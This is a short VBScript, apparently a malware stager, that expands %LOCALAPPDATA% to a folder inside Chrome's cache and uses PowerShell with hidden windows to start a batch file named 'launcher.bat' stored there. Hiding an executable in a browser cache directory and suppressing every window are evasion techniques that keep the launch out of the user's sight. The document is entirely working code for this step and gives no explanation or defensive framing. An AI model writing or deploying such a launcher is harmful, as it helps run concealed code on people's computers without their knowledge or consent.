Set WshShell = CreateObject("WScript.Shell")
' Expand %LOCALAPPDATA%
path = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached"
' Build command
cmd = "powershell -WindowStyle Hidden -Command ""Start-Process 'launcher.bat' -WorkingDirectory '" & path & "' -WindowStyle Hidden"""
' Run hidden
WshShell.Run cmd, 0, False